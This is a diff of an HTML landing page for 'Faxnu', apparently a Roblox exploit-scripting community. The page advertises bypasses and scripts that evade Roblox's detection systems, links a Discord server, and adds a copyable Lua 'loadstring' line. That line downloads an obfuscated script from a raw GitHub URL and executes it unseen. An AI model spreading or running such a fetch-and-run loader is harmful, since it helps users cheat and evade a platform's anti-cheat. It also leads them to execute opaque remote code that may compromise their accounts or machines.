@@ -1,18 +1,133 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 
 <head>
-  <title>
-      Faxnu
-  </title>
+  <meta charset="UTF-8">
+  <title>Faxnu</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      color: white;
+      background: linear-gradient(135deg, #ff2b2b, #2b59ff);
+      background-size: cover;
+      background-attachment: fixed;
+      min-height: 100vh;
+      text-align: center;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px;
+    }
+
+    .logo {
+      max-width: 300px;
+      width: 80%;
+      margin-bottom: 10px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+      border-radius: 12px;
+    }
+
+    .community-text {
+      margin-bottom: 15px;
+      font-size: 1.1em;
+      color: #fefefe;
+      text-shadow: 1px 1px 3px black;
+    }
+
+    .discord-box {
+      background-color: rgba(0, 0, 0, 0.4);
+      padding: 12px 18px;
+      border-radius: 10px;
+      box-shadow: 0 0 12px rgba(0, 0, 0, 0.4);
+      margin-bottom: 40px;
+      transition: transform 0.2s ease;
+    }
+
+    .discord-box:hover {
+      transform: scale(1.05);
+    }
+
+    .discord-box img {
+      width: 40px;
+    }
+
+    .content {
+      max-width: 900px;
+      padding: 20px;
+      text-shadow: 1px 1px 4px black;
+    }
+
+    h1 {
+      font-size: 2em;
+      margin-bottom: 20px;
+    }
+
+    h3 {
+      font-size: 1em;
+      line-height: 1.7;
+    }
+
+    .loadstring-section {
+      margin-top: 50px;
+      background-color: rgba(255, 255, 255, 0.1);
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+      max-width: 90%;
+      overflow-x: auto;
+    }
+
+    .loadstring-section h2 {
+      margin-bottom: 10px;
+      color: #ffffff;
+    }
+
+    .loadstring-code {
+      background-color: rgba(255, 255, 255, 0.15);
+      padding: 15px;
+      border-radius: 8px;
+      font-family: monospace;
+      color: #ffeecc;
+      font-size: 0.95em;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+  </style>
 </head>
+
 <body>
-    <h1>Faxnu, Powered by Bypass. Driven by Community.</h1>
-    <h3>Faxnu is an emerging Roblox scripting community dedicated to pushing the limits of what's possible on the platform.<br>
-        <br> With a strong focus on innovation and performance,<br> Faxnu aims to provide users with some of the best bypasses in the scene while delivering powerful, cutting-edge scripts that evade detection while maintaining stability.<br> 
+  <div class="container">
+    <img class="logo" src="https://raw.githubusercontent.com/Unworns/FAXNU/refs/heads/main/FAXNU%20concept.png" alt="FAXNU Logo">
+
+    <div class="community-text">Join the growing Faxnu community and stay updated!</div>
+
+    <a class="discord-box" href="https://discord.gg/j9yQa6CU" target="_blank" title="Join our Discord!">
+      <img src="https://cdn-icons-png.flaticon.com/512/5968/5968756.png" alt="Discord Invite">
+    </a>
+
+    <div class="content">
+      <h1>Faxnu, Powered by Bypass. Driven by Community.</h1>
+      <h3>
+        Faxnu is an emerging Roblox scripting community dedicated to pushing the limits of what's possible on the platform.<br><br>
+        With a strong focus on innovation and performance,<br> Faxnu aims to provide users with some of the best bypasses in the scene while delivering powerful, cutting-edge scripts that evade detection while maintaining stability.<br>
         Whether you're looking for advanced tools, utility scripts, or creative enhancements, Faxnu prides itself on offering a wide variety of reliable and effective solutions for both beginners and seasoned exploiters.<br>
         As the community grows, so does its commitment to security, customization, and staying ahead of Roblox's ever-evolving detection systems.
-    </h3>
+      </h3>
+    </div>
+
+    <div class="loadstring-section">
+      <h2>Loadstring</h2>
+      <div class="loadstring-code">
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Baller1223345/tresdf/refs/heads/main/Protected_2949532225163752.txt"))()
+      </div>
+    </div>
+  </div>
 </body>
 
 </html>
